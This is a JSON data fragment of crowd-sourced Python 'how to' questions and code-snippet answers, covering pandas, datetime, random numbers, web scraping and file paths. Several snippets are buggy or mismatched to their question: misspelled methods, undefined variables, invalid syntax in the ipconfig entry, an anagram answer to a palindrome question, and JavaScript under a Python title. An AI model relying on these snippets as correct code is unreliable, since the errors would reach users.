    "description": "import socket #module for gethostbyname website = 'www.google.com'# you can put any website ip = socket.gethostbyname(website) print(ip)   'Output' '142.250.182.36'#ip of google.com\n",
    "reg_date": "2021-10-12T11:30:18.000Z"
  },
  {
    "id": 1583,
    "keyword": null,
    "link": null,
    "title": " how to find palingrams python",
    "description": "\"\"\" Program:  Python program to find anagrams in a list of strings \"\"\" from collections import Counter  def get_anagrams(input_string_list, test_string):         print(\"*******************\")    print(\"input_string_list = \", input_string_list)    print(\"*******************\\n\")     # Find the list of anagrams in the strings        out_string_list = list(filter(lambda x: (Counter(test_string) == Counter(x)), input_string_list))      # Print the list of anagrams in the strings     print(\"*******************\")    print(\"out_string_list = \", out_string_list)    print(\"*******************\\n\")  def Driver():     input_string_list = ['Python', 'Program', 'Machine', 'yPtnoh', 'Learning']    test_string = \"ntoyPh\"    get_anagrams(input_string_list, test_string)  if __name__==\"__main__\":     Driver()          # call Driver() function\n",
    "reg_date": "2021-10-12T11:30:18.000Z"
  },
  {
    "id": 1584,
    "keyword": null,
    "link": null,
    "title": " how to find permutation of three numbers in python list",
    "description": "if __name__ == '__main__':     x = int(input())+1     y = int(input())+1     z = int(input())+1     n = int(input())     variable = []     for i in range(0,x):         for j in range(0,y):             for k in range(0,z):                 if ( i+j+k) != n:                     variable.append([i, j, k]) print(variable)\n",
    "reg_date": "2021-10-12T11:30:18.000Z"
  },
  {
    "id": 1585,
    "keyword": null,
    "link": null,
    "title": " how to find python location in cmd",
    "description": "python -c \"import sys; print(sys.executable)\" \n",
    "reg_date": "2021-10-12T11:30:18.000Z"
  },
  {
    "id": 1586,
    "keyword": null,
    "link": null,
    "title": " how to find python version",
    "description": "# To check your Python version in the command line use: python --version  # To check your Python verson inside a script use: import sys print(sys.version)\npython --version\npython3 --version\t# This is to check the python 3 version on mac terminal\nimport platform print(platform.python_version())\n# To check Python version  python -V ----or---- python --version\npython --version #in command line  python #or by enterng interactiv mode\n",
    "reg_date": "2021-10-12T11:30:18.000Z"
  },
  {
    "id": 1587,
    "keyword": null,
    "link": null,
    "title": " how to find range of dates in between two dates unsing python",
    "description": " sdate = date(2008, 8, 15)   # start date edate = date(2008, 9, 15)   # end date  delta = edate - sdate       # as timedelta  for i in range(delta.days + 1):     day = sdate + timedelta(days=i)     print(day)\n",
    "reg_date": "2021-10-12T11:30:18.000Z"
  },
  {
    "id": 1588,
    "keyword": null,
    "link": null,
    "title": " how to find rows with missing data in pandas",
    "description": "null_data = df[df.isnull().any(axis=1)]\ndf[df['column_name'].isnull()]\n",
    "reg_date": "2021-10-12T11:30:18.000Z"
  },
  {
    "id": 1589,
    "keyword": null,
    "link": null,
    "title": " how to find runner up score in python",
    "description": "price=[10,20,4,5,4,6,46,43,4,64,65,8,45,55,558,15,5,4,6,5,255,5] price.sort() price.reverse() max=price[0] sec_max=price[1] print(price) print(f\"the max is {max}, runner up is {sec_max}\")\nfrom collections import Counter if __name__ == '__main__':     n = int(raw_input())     arr = Counter(map(int, raw_input().split())).keys()     arr.sort()     print arr[-2] \nn = int(input()) arr = list(map(int, input().split())) zes = max(arr) i=0 while(i<n):     if zes ==max(arr):         arr.remove(max(arr))     i+=1 print(max(arr)) #note: do not  use set() will not work for negative numbers # contact me : sandeshbhat2000@gmail.com\nif __name__ == '__main__':     n = int(input())     arr = map(int, input().split())     arr = list(arr)     x = max(arr)     y = -9999999     for i in range(0,n):         if arr[i]<x and arr[i] > y:             y = arr[i]          print(y) \nif __name__ == '__main__':     n = int(input())     arr = map(int, input().split())     lista = list(arr)     lista.sort()     maximo = max(lista)     for actual in reversed(lista):         if actual == maximo:             lista.remove(max(lista))          print(max(lista)) \n",
    "reg_date": "2021-10-12T11:30:18.000Z"
  },
  {
    "id": 1590,
    "keyword": null,
    "link": null,
    "title": " how to find the accuracy of linear regression model",
    "description": "# Simple Linear Regression # Importing the libraries import numpy as np import matplotlib.pyplot as plt import pandas as pd # Importing the dataset dataset = pd.read_csv('Salary_Data.csv') X = dataset.iloc[:, :-1].values y = dataset.iloc[:, 1].values # Splitting the dataset into the Training set and Test set from sklearn.cross_validation import train_test_split X_train, X_test, y_train, y_test = train_test_split(X, y, test_size = 1/3, random_state = 42) # Fitting Simple Linear Regression to the Training set from sklearn.linear_model import LinearRegression regressor = LinearRegression() regressor.fit(X_train, y_train) # Predicting the Test set results y_pred = regressor.predict(X_test) print('Coefficients: \\n', regressor.coef_) # The mean squared error print(\"Mean squared error: %.2f\" % np.mean((regressor.predict(X_test) - y_test) ** 2)) # Explained variance score: 1 is perfect prediction print('Variance score: %.2f' % regressor.score(X_test, y_test))\n",
    "reg_date": "2021-10-12T11:30:18.000Z"
  },
  {
    "id": 1591,
    "keyword": null,
    "link": null,
    "title": " how to find the datatype of a variable in python",
    "description": "# you can use the function type() which will returns the type of the variable A = \"Hello world !\" # here are some uses of it >>> type(A) <class 'str'> >>> type(A) is int False >>> type(A) is str True\nTo find the data type of data in Python, you use the type() function. You place the variable inside of the type() function and Python returns the data type\n",
    "reg_date": "2021-10-12T11:30:19.000Z"
  },
  {
    "id": 1592,
    "keyword": null,
    "link": null,
    "title": " how to find the longest string in a list in python",
    "description": "a_list = [\"a_string\", \"the_longest_string\", \"string\"] longest_string = max(a_list, key=len) print(longest_string)\ndef longest(list1):     longest_list = max(len(elem) for elem in list1)     return longest_list\n",
    "reg_date": "2021-10-12T11:30:19.000Z"
  },
  {
    "id": 1593,
    "keyword": null,
    "link": null,
    "title": " how to find the mode using pandas groupby",
    "description": "source.groupby(['Country','City']).agg(lambda x:x.value_counts().index[0])\n",
    "reg_date": "2021-10-12T11:30:19.000Z"
  },
  {
    "id": 1594,
    "keyword": null,
    "link": null,
    "title": " how to find the most frequent value in a column in pandas dataframe",
    "description": "df['item']. value_counts(). idxmax()\n",
    "reg_date": "2021-10-12T11:30:19.000Z"
  },
  {
    "id": 1595,
    "keyword": null,
    "link": null,
    "title": " how to find the multiples of a number in python",
    "description": "def multiples(m, count):     for i in range(count):         print(i*m)\n",
    "reg_date": "2021-10-12T11:30:19.000Z"
  },
  {
    "id": 1596,
    "keyword": null,
    "link": null,
    "title": " how to find the version of python command linw",
    "description": "python --version\n",
    "reg_date": "2021-10-12T11:30:19.000Z"
  },
  {
    "id": 1597,
    "keyword": null,
    "link": null,
    "title": " how to find the width of a image pygame",
    "description": "width = surface.get_size()[0] height = surface.get_size()[1]\n",
    "reg_date": "2021-10-12T11:30:19.000Z"
  },
  {
    "id": 1598,
    "keyword": null,
    "link": null,
    "title": " how to find where python is located",
    "description": ">>> import os >>> import sys >>> os.path.dirname(sys.executable) 'C:\\\\Python25'\n",
    "reg_date": "2021-10-12T11:30:19.000Z"
  },
  {
    "id": 1599,
    "keyword": null,
    "link": null,
    "title": " how to find word in file python",
    "description": "with open('example.txt') as f:     if 'blabla' in f.read():         print(\"true\")\n f = open(filename,  \"r\")    whattoReturn = \"None\"    if strToFind in f.read():       whattoReturn = strToFind\n",
    "reg_date": "2021-10-12T11:30:19.000Z"
  },
  {
    "id": 1600,
    "keyword": null,
    "link": null,
    "title": " how to fix turtle has no member",
    "description": "from turtle import Screen, Turtle  screen = Screen()  turtle = Turtle()  turtle.forward(100)  screen.mainloop()\n",
    "reg_date": "2021-10-12T11:30:19.000Z"
  },
  {
    "id": 1601,
    "keyword": null,
    "link": null,
    "title": " how to flip a list backwards in python",
    "description": "myList = [0,1,2,3,4,5] myList.reverse() print(myList) #OR print(myList[::-1])\nmy_list = [1, 7, 9, 11, 12, 20] # Reverse a list by using a slice print(my_list[::-1])\n",
    "reg_date": "2021-10-12T11:30:19.000Z"
  },
  {
    "id": 1602,
    "keyword": null,
    "link": null,
    "title": " how to format 1000 to 1k in python",
    "description": "Use the Python Numerize Library  For example  from numerize import numerize     n = numerize.numerize(100) # 100 n = numerize.numerize(1000) # 1k n= numerize.numerize(1500) # 1.5k n = numerize.numerize(1000000) # 1M  n = numerize.numerize(1123456) # so on or and so forth\n",
    "reg_date": "2021-10-12T11:30:20.000Z"
  },
  {
    "id": 1603,
    "keyword": null,
    "link": null,
    "title": " how to generate a random number python",
    "description": "# generate random integer values from random import randint  value = randint(0, 10) print(value) \nfrom random import randint  print(randint(1,5))  ##Possible Outputs## #1 #2 #3 #4 #5\n# To create a list of random integer values: import random randomlist = random.sample(range(10, 30), 5) # Output: # [16, 19, 13, 18, 15]  # To create a list of random float numbers: import numpy random_float_array = numpy.random.uniform(75.5, 125.5, 2) # Output: # [107.50697835, 123.84889979]\nimport random n = random.randint(0,22) print(n)\n# generate random integer values from random import seed from random import randint # seed random number generator seed(1) # generate some integers for _ in range(10): \tvalue = randint(0, 10) \tprint(value) \nfrom random import randint  radnom_number = randint(1, 10) # generate random number from 1 to 10. including 10  print(radnom_number)  # Possible outputs # 1 # 2 # 3 # 4 # 5 # 6 # 7 # 8 # 9 # 10\n",
    "reg_date": "2021-10-12T11:30:20.000Z"
  },
  {
    "id": 1604,
    "keyword": null,
    "link": null,
    "title": " how to generate password in python efficiently",
    "description": "import string from random import * characters = string.ascii_letters + string.punctuation  + string.digits password =  \"\".join(choice(characters) for x in range(randint(8, 16))) print password \n#This is giving you a password with 8 strings and 4 numbers: import random i=0  list=[] while i < 12:     while i < 8:         list.append(random.choice(string.ascii_letters))         i+=1     while i < 12:         list.append(random.randint(0, 9))         i+=1      list=' '.join([str(elem) for elem in list]) print(\"Your new password: \", list.replace(\" \", \"\"))\nimport random letters = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'] numbers = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9'] symbols = ['!', '#', '$', '%', '&', '(', ')', '*', '+'] print(\"Welcome to the PyPassword Generator!\") nr_letters = int(input(\"How many letters would you like in your password?\\n\"))  nr_symbols = int(input(f\"How many symbols would you like?\\n\")) nr_numbers = int(input(f\"How many numbers would you like?\\n\")) password_list = [] for char in range(1, nr_letters + 1):   password_list.append(random.choice(letters)) for char in range(1, nr_symbols + 1):   password_list += random.choice(symbols) for char in range(1, nr_numbers + 1):   password_list += random.choice(numbers)  random.shuffle(password_list) password = \"\" for char in password_list:   password += char print(f\"Your password is: {password}\")\n#Simple Way To Make Password Generator #NickSiteCoder import random  characters = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789!@&euro;$#%({)}],/<\\.>[*^&\"  while 1:     length = int(input(\"What length would you like your password to be ? :\"))     count = int(input(\"How many passwords would you like ? \"))     for x in range(0, count):         password = \"\"         for x in range(0,password_len):             password_characters = random.choice(characters)             password      = password + password_characters         print(\"Here is your password : \",password)\n",
    "reg_date": "2021-10-12T11:30:20.000Z"
  },
  {
    "id": 1605,
    "keyword": null,
    "link": null,
    "title": " how to generate random normal number in python",
    "description": "from scipy.stats import norm data = norm.rvs(loc=52, scale=4.5, size=100)\n",
    "reg_date": "2021-10-12T11:30:20.000Z"
  },
  {
    "id": 1606,
    "keyword": null,
    "link": null,
    "title": " how to generate requirements.txt django",
    "description": "For Unix families: pip3 freeze > requirements.txt For Windos: pip freeze > requirements.txt\n# First: pip install pipreqs  # Then: pipreqs path/to/project  # There is now a requirements.txt file in the project folder.\n",
    "reg_date": "2021-10-12T11:30:20.000Z"
  },
  {
    "id": 1607,
    "keyword": null,
    "link": null,
    "title": " how to get 2 random inputs in a list using for loop",
    "description": "import random def deal_card():     cards = [11,2,3,4,5,6,7,8,10,10,10,10]     card = random.choice(cards)     return card User_cards = [] Comuputer_cards = [] gameover = False for _ in range(2):     Comuputer_cards.append(deal_card())     User_cards.append(deal_card())\n",
    "reg_date": "2021-10-12T11:30:20.000Z"
  },
  {
    "id": 1608,
    "keyword": null,
    "link": null,
    "title": " how to get a random element from an array in python",
    "description": "import random  #1.A single element random.choice(list)  #2.Multiple elements with replacement random.choices(list, k = 4)  #3.Multiple elements without replacement random.sample(list, 4)\nimport random names=['Mark', 'Sam', 'Henry']  #Set any array random_array_item=random.choice(names)  #Declare a variable as a random choice print(random_array_item)  #Print the random choice #Or, if you want to arrange them in any order: for j in range(names):   print(random.choice(names))\nrandom.choice(name of list)\n",
    "reg_date": "2021-10-12T11:30:20.000Z"
  },
  {
    "id": 1609,
    "keyword": null,
    "link": null,
    "title": " how to get a row from a dataframe in python",
    "description": "df.iloc[[index]] \ndfObj.iloc[: , [0, 2]] \n1. \tSelecting data by row numbers (.iloc) \t# myrow = data.iloc[<row selection>]  \tmyrow = data.iloc[7]     myrow = data.iloc[0:9]      2. \tSelecting data by label or by a conditional statement (.loc) \t# myrow = data.loc[<row selection.]   \tmyrow = data.loc['University ABC']      3. \tSelecting in a hybrid approach (.ix) (now Deprecated in Pandas 0.20.1) \t# Works like a .loc but also accepts integers - may lead to unexpected results\n",
    "reg_date": "2021-10-12T11:30:20.000Z"
  },
  {
    "id": 1610,
    "keyword": null,
    "link": null,
    "title": " how to get absolute path in python",
    "description": "import os # you have to be in the same directory as the file file = 'myfile.txt' # or also file = 'directory/to/myfile.txt'  path = os.path.abspath(file) \nfrom os import path path.abspath(\"my_path\")\n>>> import os >>> os.path.abspath(\"mydir/myfile.txt\") 'C:/example/cwd/mydir/myfile.txt' \nimport os  print('getcwd:      ', os.getcwd()) print('__file__:    ', __file__) \nfrom pathlib import Path relative = Path(\"my_path\") absolute = relative.asolute()\n>>> f = open('/Users/Desktop/febROSTER2012.xls') >>> f.name '/Users/Desktop/febROSTER2012.xls'\n",
    "reg_date": "2021-10-12T11:30:20.000Z"
  },
  {
    "id": 1611,
    "keyword": null,
    "link": null,
    "title": " how to get all links from a website python beautifulsoup",
    "description": "from bs4 import BeautifulSoup import requests  response = requests.get('url') all_links = response.find_all('a')  # this will return all links+text\nfrom BeautifulSoup import BeautifulSoupimport urllib2import redef getLinks(url):    html_page = urllib2.urlopen(url)    soup = BeautifulSoup(html_page)    links = []    for link in soup.findAll('a', attrs={'href': re.compile(\"^http://\")}):        links.append(link.get('href'))    return linksprint( getLinks(\"https://arstechnica.com\") )\nfrom BeautifulSoup import BeautifulSoupimport urllib2import rehtml_page = urllib2.urlopen(\"https://arstechnica.com\")soup = BeautifulSoup(html_page)for link in soup.findAll('a', attrs={'href': re.compile(\"^http://\")}):    print link.get('href')\nfrom BeautifulSoup import BeautifulSoupimport urllib2import rehtml_page = urllib2.urlopen(\"https://arstechnica.com\")soup = BeautifulSoup(html_page)links = []for link in soup.findAll('a', attrs={'href': re.compile(\"^http://\")}):    links.append(link.get('href'))print(links)\n",
    "reg_date": "2021-10-12T11:30:20.000Z"
  },
  {
    "id": 1612,
    "keyword": null,
    "link": null,
    "title": " how to get all links text from a website python beautifulsoup",
    "description": "from bs4 import BeautifulSoup import requests  response = requests.get('url') all_links = response.find_all('a')  # this will return all links+text\nfrom bs4 import BeautifulSoup import requests  response = requests.get('url') all_links = response.find_all('a')  # this will return all links+text for link in all_links:   print(link.get_text())\t# this will prints all text   print(link.get('href'))\t# this will print all links\nimport requests from bs4 import BeautifulSoup as bs  github_avatar = input('Input git user: ') url = 'https://github.com/'+ github_avatar r = requests.get(url) soup = bs(r.text, 'html.parser') profile_image = soup.find('img', {'alt' : 'Avatar'})['src'] # print(url) print(profile_image)\n",
    "reg_date": "2021-10-12T11:30:21.000Z"
  },
  {
    "id": 1613,
    "keyword": null,
    "link": null,
    "title": " how to get chat first name in telebot",
    "description": "@bot.message_handler(func=lambda message: True) def send_message(message:str):  user_first_name = str(message.chat.first_name) bot.reply_to(message, 'Hi ' + user_frist_name)  # Result: Hi Saeed\n",
    "reg_date": "2021-10-12T11:30:21.000Z"
  },
  {
    "id": 1614,
    "keyword": null,
    "link": null,
    "title": " how to get continuous mouse position with pyautogui in python",
    "description": "import pyautogui print(pyautogui.displayMousePosition())\n",
    "reg_date": "2021-10-12T11:30:21.000Z"
  },
  {
    "id": 1615,
    "keyword": null,
    "link": null,
    "title": " how to get current time in python",
    "description": "from datetime import datetime now = datetime.now() print (now.strftime(\"%Y-%m-%d %H:%M:%S\"))   Output: 2020-06-19 10:34:45\nimport datetime   currentDT = datetime.datetime.now() print(str(currentDT))  # prints XXXX-XX-XX XX:XX:XX.XXXXXX # or  import datetime   currentDT = datetime.datetime.now()   print (\"Current Year is: %d\" % currentDT.year) print (\"Current Month is: %d\" % currentDT.month) print (\"Current Day is: %d\" % currentDT.day) print (\"Current Hour is: %d\" % currentDT.hour) print (\"Current Minute is: %d\" % currentDT.minute) print (\"Current Second is: %d\" % currentDT.second) print (\"Current Microsecond is: %d\" % currentDT.microsecond) # prints \"\"\" Current Year is: XXXX Current Month is: XX Current Day is: XX Current Hour is: XX Current Minute is: XX Current Second is: XX Current Microsecond is: XXXXXX \"\"\"\n from datetime import datetime  now = datetime.now()  current_time = now.strftime(\"%H:%M:%S\") print(\"Current Time =\", current_time) \n\"\"\"Imports the datetime package from the Python library\"\"\" from datetime import datetime  \"\"\"Sets the variable now to the current date and time\"\"\" now = datetime.now()  \"\"\"The variable current_time contains the string values of the current time\"\"\" current_time = now.strftime(\"%H:%M:%S\") print(\"Current Time =\", current_time)\n from datetime import datetime  now = datetime.now().time() # time object  print(\"now =\", now) print(\"type(now) =\", type(now))\t\nimport time  t = time.localtime() current_time = time.strftime(\"%H:%M:%S\", t) print(current_time) \n",
    "reg_date": "2021-10-12T11:30:21.000Z"
  },
  {
    "id": 1616,
    "keyword": null,
    "link": null,
    "title": " how to get device name using pythno",
    "description": "function isMobileDevice() {      var check = false;      (function(a){if(/(android|bb\\d+|meego).+mobile|avantgo|bada\\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(a)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\\-(n|u)|c55\\/|capi|ccwa|cdm\\-|cell|chtm|cldc|cmd\\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\\-s|devi|dica|dmob|do(c|p)o|ds(12|\\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\\-|_)|g1 u|g560|gene|gf\\-5|g\\-mo|go(\\.w|od)|gr(ad|un)|haie|hcit|hd\\-(m|p|t)|hei\\-|hi(pt|ta)|hp( i|ip)|hs\\-c|ht(c(\\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\\-(20|go|ma)|i230|iac( |\\-|\\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\\/)|klon|kpt |kwc\\-|kyo(c|k)|le(no|xi)|lg( g|\\/(k|l|u)|50|54|\\-[a-w])|libw|lynx|m1\\-w|m3ga|m50\\/|ma(te|ui|xo)|mc(01|21|ca)|m\\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\\-2|po(ck|rt|se)|prox|psio|pt\\-g|qa\\-a|qc(07|12|21|32|60|\\-[2-7]|i\\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\\-|oo|p\\-)|sdk\\/|se(c(\\-|0|1)|47|mc|nd|ri)|sgh\\-|shar|sie(\\-|m)|sk\\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\\-|v\\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\\-|tdg\\-|tel(i|m)|tim\\-|t\\-mo|to(pl|sh)|ts(70|m\\-|m3|m5)|tx\\-9|up(\\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\\-|your|zeto|zte\\-/i.test(a.substr(0,4))) check = true;})(navigator.userAgent||navigator.vendor||window.opera);      return check;  };\nimport socket socket.gethostname()\n",
    "reg_date": "2021-10-12T11:30:21.000Z"
  },
  {
    "id": 1617,
    "keyword": null,
    "link": null,
    "title": " how to get distinct value in a column dataframe in python",
    "description": "df.column.unique()\nnote:df is syour dataframe   print(df['emp_title'].isnull().sum())\ndf.iloc[1:3, 5:7]\n",
    "reg_date": "2021-10-12T11:30:21.000Z"
  },
  {
    "id": 1618,
    "keyword": null,
    "link": null,
    "title": " how to get file name without extension in python",
    "description": ">>> import os >>> base=os.path.basename('/root/dir/sub/file.ext') >>> base 'file.ext' >>> os.path.splitext(base) ('file', '.ext') >>> os.path.splitext(base)[0] 'file' \n#Using pathlib in Python 3.4+ from pathlib import Path Path('/root/dir/sub/file.ext').stem\n",
    "reg_date": "2021-10-12T11:30:21.000Z"
  },
  {
    "id": 1619,
    "keyword": null,
    "link": null,
    "title": " how to get frequency of each elements in a python list",
    "description": "# easiest way to count the frequency of all elements in a list lst = ['Sam', 'Sam', 'Tim', 'Tim', 'Tim', 'r', 'l']  freq = {} # stores the frequency of elements counting = [freq.update({x: lst.count(x)}) for x in lst]  # output of freq  {'Sam': 2, 'Tim': 3, 'r': 1, 'l': 1}  #credit: buggyprogrammer.com #Note: if you print \"counting\" it will return a list full of None so ignore it. \nfrom collections import Counter  def frequency_table(n):     table = Counter(n)     print('Number\\tFrequency')     for number in table.most_common() :         print('{0}\\t{1}'.format(number[0], number[1]))          # src : Doing Math With Python\n",
    "reg_date": "2021-10-12T11:30:21.000Z"
  },
  {
    "id": 1620,
    "keyword": null,
    "link": null,
    "title": " how to get image in jupyter notebook",
    "description": "from IPython import display display.Image(\"./image.png\")\n#If you want it on a \"Code\" cell from IPython.display import Image Image(\"img/picture.png\")  #If you want it on a \"Markdown\" cell ![title](img/picture.png)\n",
    "reg_date": "2021-10-12T11:30:21.000Z"
  },
  {
    "id": 1621,
    "keyword": null,
    "link": null,
    "title": " how to get input from user in pyqt5",
    "description": "name, result = QtWidgets.QInputDialog.getText(MainWindow, \"Name of the Team\",                                                           \"Enter the name of your team:\") # Put this code inside a function and connect it to any signal.\n",
    "reg_date": "2021-10-12T11:30:21.000Z"
  },
  {
    "id": 1622,
    "keyword": null,
    "link": null,
    "title": " how to get ipconfig from python",
    "description": "import os  commend = ipconfig\\input(give me a commend) res = os.popen(commend) print(res.read)\n",
    "reg_date": "2021-10-12T11:30:21.000Z"
  },
  {
    "id": 1623,
    "keyword": null,
    "link": null,
    "title": " how to get just the filename in python",
    "description": " import os >>> base=os.path.basename('/root/dir/sub/file.ext') >>> base 'file.ext' >>> os.path.splitext(base) ('file', '.ext') >>> os.path.splitext(base)[0] 'file'\n",
    "reg_date": "2021-10-12T11:30:22.000Z"
  },
  {
    "id": 1624,
    "keyword": null,
    "link": null,
    "title": " how to get last values or data in django orm",
    "description": "my_queryset.reverse()[:5] \n",
    "reg_date": "2021-10-12T11:30:22.000Z"
  },
  {
    "id": 1625,
    "keyword": null,
    "link": null,
    "title": " how to get local ip in python",
    "description": "import socket local_ip = socket.gethostbyname(socket.gethostname) print(f\"[+] Your Local IP is : {local_ip}\")\nimport socket     host = socket.getfqdn()     addr = socket.gethostbyname(host) print(f\"Your ip is {addr}\") # On Linux, it may give you the localhost address\nimport socket local_ip = socket.gethostbyname(socket.gethostname()) print(f\"[+] Your Local IP is : {local_ip}\")\n",
    "reg_date": "2021-10-12T11:30:22.000Z"
  },
  {
    "id": 1626,
    "keyword": null,
    "link": null,
    "title": " how to get matrix element in the form of matrix in python",
    "description": "# A basic code for matrix input from user     R = int(input(\"Enter the number of rows:\"))  C = int(input(\"Enter the number of columns:\"))     # Initialize matrix  matrix = []  print(\"Enter the entries rowwise:\")     # For user input  for i in range(R):          # A for loop for row entries      a =[]      for j in range(C):      # A for loop for column entries           a.append(int(input()))      matrix.append(a)     # For printing the matrix  for i in range(R):      for j in range(C):          print(matrix[i][j], end = \" \")      print() \n",
    "reg_date": "2021-10-12T11:30:22.000Z"
  },
  {
    "id": 1627,
    "keyword": null,
    "link": null,
    "title": " how to get micro symbol in python",
    "description": "\"\\u03BC\"\n",
    "reg_date": "2021-10-12T11:30:22.000Z"
  },
  {
    "id": 1628,
    "keyword": null,
    "link": null,
    "title": " how to get name of class in class python",
    "description": "class SillyClassName:     @classmethod  \tdef my_name(cls_): \t\treturn cls_.__name__   def class_name(self):   \t# self.__class__ gets the current class     # .__name__ gets the name \treturn self.__class__.__name__  SillyClassName.my_name() # prints SillyClassName  inst = SillyClassName() inst.class_name() # prints SillyClassName\n",
    "reg_date": "2021-10-12T11:30:22.000Z"
  },
  {
    "id": 1629,
    "keyword": null,
    "link": null,
    "title": " how to get number of cores in python",
    "description": "import multiprocessing  multiprocessing.cpu_count() # or os.cpu_count()\n",
    "reg_date": "2021-10-12T11:30:22.000Z"
  },
  {
    "id": 1630,
    "keyword": null,
    "link": null,
    "title": " how to get prime numbers in a list in python using list comprehension",
    "description": ">>> [x for x in range(2, 20)      if all(x % y != 0 for y in range(2, x))] [2, 3, 5, 7, 11, 13, 17, 19] \n",
    "reg_date": "2021-10-12T11:30:22.000Z"
  },
  {
    "id": 1631,
    "keyword": null,
    "link": null,
    "title": " how to get pygame key",
    "description": "# current state of all the keys (pressed, not pressed) pygame.key.get_pressed\n",
    "reg_date": "2021-10-12T11:30:22.000Z"
  },
  {
    "id": 1632,
    "keyword": null,
    "link": null,
    "title": " how to get pygame window height size",
    "description": "import pygame pygame.init()  window = pygame.display.set_mode((500, 500)) x, y = window.get_size()  print(\"The width is %s\" %x) print(\"The height is %s\" %y)\n",
    "reg_date": "2021-10-12T11:30:22.000Z"
  },
  {
    "id": 1633,
    "keyword": null,
    "link": null,
    "title": " how to get size of folder python",
    "description": "import os  def get_size(start_path = '.'):     total_size = 0     for dirpath, dirnames, filenames in os.walk(start_path):         for f in filenames:             fp = os.path.join(dirpath, f)             # skip if it is symbolic link             if not os.path.islink(fp):                 total_size += os.path.getsize(fp)      return total_size  print(get_size(), 'bytes')\n",
    "reg_date": "2021-10-12T11:30:23.000Z"
  },
  {
    "id": 1634,
    "keyword": null,
    "link": null,
    "title": " how to get started with python",
    "description": "#the best way to start with anything is not to rush and start with the basics #python however is really good for begginers as it is easy to read and understaned #and has relatively easy syntax so dont spend a lot of time on the basics like #print() and if  rather learn the basics and learn about the libraries  #and a good way to learn about the libraries is https://pypi.org/ if you are also #struggling to find motivation for programming the best way to work around it is #to learn how dopamine works in your brain and how to use it in progoramming #for that use the video https://www.youtube.com/watch?v=9QiE-M1LrZk #for a good IDE i reccomend pycharm #and remember programming is not something you should remember to be good  #programming is something you need to understand and to be a good programmer you  # need to know how to put the internet to a good use and to know where to search  #if this helped leave it an upvote  #rubel1130 :)\n\"\"\" Great foundation for basics  https://www.w3schools.com/python/default.asp\" \"\"\"\n",
    "reg_date": "2021-10-12T11:30:23.000Z"
  },
  {
    "id": 1635,
    "keyword": null,
    "link": null,
    "title": " how to get text from a website python",
    "description": " import requests from bs4 import BeautifulSoup #pip install bs4  url = 'https://www.troyhunt.com/the-773-million-record-collection-1-data-reach/' res = requests.get(url) html_page = res.content soup = BeautifulSoup(html_page, 'html.parser') text = soup.find_all(text=True)  output = '' blacklist = [     '[document]',     'noscript',     'header',     'html',     'meta',     'head',      'input',     'script',     # there may be more elements you don't want, such as \"style\", etc. ]  for t in text:     if t.parent.name not in blacklist:         output += '{} '.format(t)  print(output) \n",
    "reg_date": "2021-10-12T11:30:23.000Z"
  },
  {
    "id": 1636,
    "keyword": null,
    "link": null,
    "title": " how to get the calendar of current month in python",
    "description": "import calendar import datetime month = datetime.date.today().month year = datetime.date.today().year print (calendar.month(year,month))\n",
    "reg_date": "2021-10-12T11:30:23.000Z"
  },
  {
    "id": 1637,
    "keyword": null,
    "link": null,
    "title": " how to get the contents of a txt file in python",
    "description": "with open (\"data.txt\", \"r\") as myfile:     data = myfile.read().splitlines() \npath= #path here with open(path) as file \tcontents = file.read()\n",
    "reg_date": "2021-10-12T11:30:23.000Z"
  },
  {
    "id": 1638,
    "keyword": null,
    "link": null,
    "title": " how to get the current date hour minute month year in python",
    "description": "import datetime now = datetime.datetime.now().year print(now)\nimport datetime now = datetime.datetime.now() print now.year, now.month, now.day, now.hour, now.minute, now.second # 2015 5 6 8 53 40\n######################################################################## import datetime now = datetime.datetime.now() print(now.year, now.month, now.day, now.hour, now.minute, now.second) ######################################################################## from datetime import * now = datetime.now() print(now.year, now.month, now.day, now.hour, now.minute, now.second) ########################################################################\n",
    "reg_date": "2021-10-12T11:30:23.000Z"
  },
  {
    "id": 1639,
    "keyword": null,
    "link": null,
